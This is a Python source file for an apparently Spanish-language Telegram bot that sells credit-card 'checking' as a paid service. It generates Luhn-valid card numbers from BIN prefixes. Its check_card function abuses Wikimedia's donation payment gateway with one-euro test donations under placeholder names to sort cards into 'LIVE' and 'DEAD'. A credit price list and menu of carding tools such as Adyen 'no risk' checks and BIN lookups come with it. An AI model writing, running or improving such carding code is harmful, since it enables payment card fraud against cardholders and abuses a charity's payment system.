import asyncio
import json
import random
import re
import os
import threading
from datetime import datetime
from flask import Flask, request
from aiogram import Bot, Dispatcher, types
from aiogram import F
import requests
from colorama import init, Fore, Style

init(autoreset=True)

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7709461067))

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

DB_FILE = "users.json"

def load_users():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=4)

# ================= CHECKER =================
def check_card(cc, mes, ano, cvv):
    try:
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        r = s.get("https://payments.wikimedia.org/index.php?title=Special:GravyGateway&appeal=WP25&country=ES&currency=EUR&payment_method=cc&gateway=gravy&amount=1.0&uselang=es-419", timeout=20)
        html = r.text

        wmf_token = ""
        for line in html.splitlines():
            if 'name="wmf_token"' in line and 'value="' in line:
                wmf_token = line.split('value="')[1].split('"')[0]
                break

        m = re.search(r'gravy_session_id["\']?\s*:\s*["\']([^"\']+)', html)
        gravy_session = m.group(1) if m else None

        yy = ano[-2:] if len(ano) == 4 else ano
        exp = f"{mes}/{yy}"

        s.put(f"https://api.wikimedia.gr4vy.app/checkout/sessions/{gravy_session}/fields",
              json={"payment_method": {"method": "card", "number": cc, "expiration_date": exp, "security_code": cvv}}, timeout=15)

        donate = {
            "action": "di_donate_gravy", "gateway": "gravy", "currency": "EUR", "amount": "1.0",
            "first_name": "Test", "last_name": "User", "email": "test@live.com", "country": "ES",
            "payment_method": "cc", "gateway_session_id": gravy_session, "wmf_token": wmf_token or "dummy",
            "format": "json", "opt_in": "0", "color_depth": "32", "screen_height": "1080",
            "screen_width": "1920", "time_zone_offset": "-120"
        }

        r = s.post("https://payments.wikimedia.org/api.php", data=donate, timeout=20)
        resp = r.json()
        result = resp.get("result", {})

        if result.get("errors") or result.get("isFailed") is True:
            return "DEAD"
        return "LIVE"
    except:
        return "DEAD"

# ================= GEN =================
def luhn(card):
    digits = [int(x) for x in card]
    for i in range(len(digits)-2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9: digits[i] -= 9
    return sum(digits) % 10 == 0

def gen_cc(bin_prefix):
    bin_prefix = re.sub(r'[xX]', '', str(bin_prefix))
    while True:
        cc = bin_prefix + ''.join(str(random.randint(0,9)) for _ in range(16 - len(bin_prefix) - 1))
        check = (10 - sum(int(d) for d in cc) % 10) % 10
        cc += str(check)
        if luhn(cc):
            return cc

# ================= /START =================
@dp.message(F.text.in_(["/start", "/menu"]))
async def start(msg: types.Message):
    await msg.answer("""
力 - Gates / Tools 🤌🥓
━━━━━━━━━━━━━━
美 - Checking Cards 美

⚡️ /s | Single Card
❌0.7 Credits ✅1.2 Credits

⚡️ /m | Masscheking
❌1.0 Credits ✅1.5 Credits

━━━━ ━━━━ ━━━━

🔥/a | Adyen no risk
☀️ /n | MassAdyen no risk

Price (Both $0.99):
❌ 1.5 Credits ✅ 3.0 Credits

━━━━━━━━━━━━━━
幸 - Tools ⚙️

💳/gen
🔎/bin
⚠️/vbv
👛/extra
🔗/addr
✈️/refe
💰/info
━━━━━━━━━━━━━━

⭐️🦎 Lista de Precios ⭐️🦎
━━━━━━━━━━━━━━
➡️ 1 USD = 20 créditos
➡️ 5 USD = 100 créditos
✅ 15 USD = 330 créditos
✔️ 50 USD = 1150 créditos
✔️ 100 USD = 2400 créditos
━━━━━━━━━━━━━━
©️ Costos por Transacción Single:
✅ 1.2 Crédito por Live
❌ 0.7 Créditos por Dead
🔥 0 Créditos por Cookie Error
━━━━━━━━━━━━━
©️ Costos por Transacción Mass:
✅ 1.5 Crédito por Live
❌ 1.0 Créditos por Dead
🔥 0 Créditos por Cookie Error
━━━━━━━━━━━━━━
⚡️¡Más compras = Más ahorro!♥️
    """)

# ================= COMANDOS =================
@dp.message(F.text.startswith(("/gen", ".gen")))
async def gen(msg: types.Message):
    try:
        binp = msg.text.split()[1]
    except:
        return await msg.answer("Uso: `/gen 409013`")

    cards = [f"{gen_cc(binp)}|{random.randint(1,12):02d}|{random.randint(2026,2035)}|{random.randint(100,999)}" for _ in range(10)]

    text = "━━━━━━━━━━━━━━\n" + "\n".join(cards) + "\n━━━━━━━━━━━━━━\n"
    text += f"• BIN : {binp} - ES 🇪🇸\n"
    text += "By: @" + (msg.from_user.username or msg.from_user.first_name)

    sent = await msg.answer(text)
    await bot.send_message(msg.chat.id, "Responde con `/a` (una) o `/n` (todas)", reply_to_message_id=sent.message_id)

@dp.message(F.text.startswith(("/info", ".info")))
async def info(msg: types.Message):
    uid = str(msg.from_user.id)
    users = load_users()
    u = users.get(uid, {"credits": 0.0})
    await msg.answer(f"""
亏 - Stats
━━━━━━━━━
火 ID: {msg.from_user.id}
火 Name: {msg.from_user.first_name}
火 Username: @{msg.from_user.username or 'No'}
━━━━━━━━━
干 Credits: {u['credits']:.2f}
━━━━━━━━━
    """)

@dp.message(F.text.startswith(("/add", ".add")))
async def add_credits(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return await msg.answer("❌ No autorizado.")
    try:
        _, target, cant = msg.text.split()
        users = load_users()
        uid = str(target)
        if uid not in users:
            users[uid] = {"credits": 0.0, "banned": False}
        users[uid]["credits"] += float(cant)
        save_users(users)
        await msg.answer(f"""
✅ Créditos Añadidos
━━━━━━━━━
👤 Usuario: {target}
💰 Créditos añadidos: {cant}
🔹 Nuevos créditos: {users[uid]['credits']}
━━━━━━━━━
        """)
    except:
        await msg.answer("Uso: `/add ID CANTIDAD`")

@dp.message(F.text.startswith(("/s ", ".s ")))
async def single_auth(msg: types.Message):
    uid = str(msg.from_user.id)
    users = load_users()
    u = users.get(uid, {"credits": 0.0})
    if u["credits"] < 0.7:
        return await msg.answer("❌ Créditos insuficientes.")
    try:
        data = msg.text.split()[1]
        cc, mes, ano, cvv = data.split("|")
        if len(ano) == 2: ano = "20" + ano
        status = check_card(cc, mes, ano, cvv)
        cost = 1.2 if status == "LIVE" else 0.7
        u["credits"] -= cost
        users[uid] = u
        save_users(users)

        await msg.answer(f"""
水口 - Time: 2.85's 😺 水
━━Card Information━━
• Card: {cc}|{mes}|{ano}|{cvv}
• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
• Gateway: Wikimedia Gravy
━━━━━━━━━━━━━━━━━━━━━━━━━━
By: @{msg.from_user.username or msg.from_user.first_name} | Créditos restantes: {u['credits']:.2f}
        """)
    except:
        await msg.answer("Formato: `/s 4111111111111111|12|2028|123`")

@dp.message(F.text.startswith(("/a ", ".a ")))
async def single_charge(msg: types.Message):
    uid = str(msg.from_user.id)
    users = load_users()
    u = users.get(uid, {"credits": 0.0})
    if u["credits"] < 1.5:
        return await msg.answer("❌ Créditos insuficientes.")
    try:
        data = msg.text.split()[1]
        cc, mes, ano, cvv = data.split("|")
        if len(ano) == 2: ano = "20" + ano
        status = check_card(cc, mes, ano, cvv)
        cost = 3.0 if status == "LIVE" else 1.5
        u["credits"] -= cost
        users[uid] = u
        save_users(users)

        await msg.answer(f"""
水口 - Time: 4.65's 😺 水
━━Card Information━━
• Card: {cc}|{mes}|{ano}|{cvv}
• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
• Gateway: Adyen CCN NR
• Charge: $0.99
━━━━━━━━━━━━━━━━━━━━━━━━━━
By: @{msg.from_user.username or msg.from_user.first_name} | Créditos restantes: {u['credits']:.2f}
        """)
    except:
        await msg.answer("Formato: `/a 4111111111111111|12|2028|123`")

@app.route('/')
def home():
    return "Bot Wikimedia Gravy - EDEN-XANDER corriendo 24/7 🔥"

async def on_startup():
    print(Fore.GREEN + "Eliminando webhook anterior...")
    await bot.delete_webhook()
    print(Fore.GREEN + "✅ Webhook eliminado - Iniciando polling...")

def run_bot():
    print(Fore.GREEN + "Bot iniciado en Render 24/7 - EDEN-XANDER (Polling Mode)")
    asyncio.run(dp.start_polling(bot, handle_signals=False))

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print(f"Flask corriendo en puerto {port}")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(on_startup())
    
    thread = threading.Thread(target=run_bot, daemon=True)
    thread.start()
    
    app.run(host="0.0.0.0", port=port)
